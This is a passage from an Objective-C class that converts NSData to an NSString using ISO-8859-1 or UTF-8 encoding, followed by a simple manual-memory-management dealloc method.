	} else if ([contentsFromData isEqualToString:@"iso-8859-1"]) {
		contentsFromData = [[NSString alloc] initWithData:aData encoding:NSISOLatin1StringEncoding];
	} else { // UTF8
		contentsFromData = [[NSString alloc] initWithData:aData encoding:NSUTF8StringEncoding];
	}
	return [contentsFromData autorelease];
}

/**
 - Method name: dealloc
 - Purpose:  This method is used to manage memory
 - Argument list and description: No Argument
 - Return type and description: No Return 
*/

-(void) dealloc {
    [super dealloc];
}

@end
